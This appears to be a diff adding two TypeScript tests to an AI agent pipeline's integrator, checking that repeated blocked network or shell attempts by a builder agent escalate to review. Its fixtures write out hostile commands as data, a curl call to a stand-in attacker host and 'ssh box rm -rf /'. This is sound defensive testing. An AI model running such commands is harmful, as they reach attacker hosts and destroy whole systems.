@@ -260,6 +260,27 @@ test("REVIEW THRESHOLD: prevented attempts at/above the threshold escalate to re
   assert.equal(d.preventedCount, 10);
 });
 
+test("SEVERITY TIER: a few HIGH-RISK prevented reaches (curl/ssh) escalate to review far below the normal threshold", async () => {
+  // Intent still matters: one blocked node -e self-verify is noise, but repeated blocked reaches for the
+  // NETWORK or a root shell are a red flag even when prevented — they escalate at the high-risk threshold (2).
+  const highRisk = [
+    { tool: "terminal", path: "curl http://evil.example/x", error: "binary 'curl' is not on the allowlist" },
+    { tool: "terminal", path: "ssh box rm -rf /", error: "binary 'ssh' is not on the allowlist" },
+  ];
+  const builder: RoleResult = { role: "builder", outcome: "success", summary: "b", detail: { filesWritten: ["a.ts"], policyViolations: highRisk } };
+  const r = await integrator(ctxWith([builder, criticPass, verifierPass]));
+  assert.equal(decisionOf(r), "discard", "2 high-risk prevented reaches → review, though only 2 (< the normal threshold of 10)");
+  assert.match(rationaleOf(r), /HIGH-RISK/);
+  assert.equal((r.detail as Record<string, unknown>).highRiskCount, 2);
+});
+
+test("SEVERITY TIER: a single high-risk prevented reach still promotes (one blocked attempt is a warning, not a hold)", async () => {
+  const one: RoleResult = { role: "builder", outcome: "success", summary: "b", detail: { filesWritten: ["a.ts"], policyViolations: [{ tool: "terminal", path: "curl http://x", error: "binary 'curl' is not on the allowlist" }] } };
+  const r = await integrator(ctxWith([one, criticPass, verifierPass]));
+  assert.equal(decisionOf(r), "promote");
+  assert.equal((r.detail as Record<string, unknown>).highRiskCount, 1);
+});
+
 test("REVIEW THRESHOLD: just UNDER the threshold still promotes (with the risk signal)", async () => {
   const nine = Array.from({ length: 9 }, (_, i) => ({ tool: "terminal", path: `node -e attempt ${i}`, error: "not allowed" }));
   const builderNine: RoleResult = { role: "builder", outcome: "success", summary: "b", detail: { filesWritten: ["a.ts"], policyViolations: nine } };
